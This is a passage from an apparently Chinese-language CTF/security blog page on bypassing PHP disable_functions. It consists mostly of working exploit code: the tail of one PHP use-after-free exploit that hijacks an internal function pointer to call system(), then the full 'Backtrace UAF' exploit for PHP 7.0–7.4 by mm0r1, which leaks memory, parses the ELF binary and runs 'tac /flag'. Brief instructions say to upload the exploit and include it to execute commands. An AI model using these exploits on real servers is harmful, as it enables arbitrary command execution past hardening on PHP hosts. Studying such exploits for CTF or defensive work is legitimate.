language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure><p>上传这个exp然后包含执行命令即可<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703244.png" alt="image-20231206170321129"><br>也可插件直接用<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061703867.png" alt="image-20231206170329807"></p><h2 id="利用Backtrace-UAF"><a href="#利用Backtrace-UAF" class="headerlink" title="利用Backtrace UAF"></a>利用Backtrace UAF</h2><h3 id="利用条件-10"><a href="#利用条件-10" class="headerlink" title="利用条件"></a>利用条件</h3><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 &lt; 7.3.15 (released 20 Feb 2020)</li><li>PHP7.4 &lt; 7.4.3 (released 20 Feb 2020)</li></ul><h3 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h3><p>原理也是pwn<br><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">EXP</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ 